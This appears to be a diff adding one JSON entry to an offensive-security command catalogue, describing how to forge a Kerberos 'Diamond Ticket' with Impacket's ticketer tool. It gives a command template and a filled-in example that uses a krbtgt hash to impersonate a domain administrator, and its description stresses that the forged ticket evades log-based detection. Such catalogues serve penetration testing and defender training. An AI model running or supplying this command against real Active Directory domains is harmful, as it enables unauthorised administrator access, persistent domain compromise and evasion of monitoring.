@@ -1,0 +1,17 @@
+{
+  "id": "diamond-ticket",
+  "name": "Impacket Diamond Ticket",
+  "command": "impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> -request -user <low_priv_user> -password <low_priv_password> -impersonate <target_user> -duration 10 <user_to_impersonate>",
+  "description": "Forge a Diamond Ticket: request a legitimate TGT from the KDC and then patch its PAC with custom group memberships using the krbtgt key. Looks identical to a normal TGT in logs (proper KDC encryption metadata), unlike a Golden Ticket which is fully fabricated.",
+  "platform": "linux",
+  "requires": ["hash"],
+  "protocols": ["kerberos"],
+  "tags": ["impacket", "diamond-ticket", "tgt", "krbtgt", "stealth", "forgery"],
+  "references": [
+    { "title": "Semperis — Diamond Ticket", "url": "https://www.semperis.com/blog/diamond-and-sapphire-tickets-the-evolution-of-golden-ticket/" },
+    { "title": "Impacket — ticketer.py", "url": "https://github.com/fortra/impacket/blob/master/examples/ticketer.py" }
+  ],
+  "examples": [
+    "impacket-ticketer -nthash 5f4dcc3b5aa765d61d8327deb882cf99 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -request -user jdoe -password 'Password123!' -impersonate administrator -duration 10 administrator"
+  ]
+}
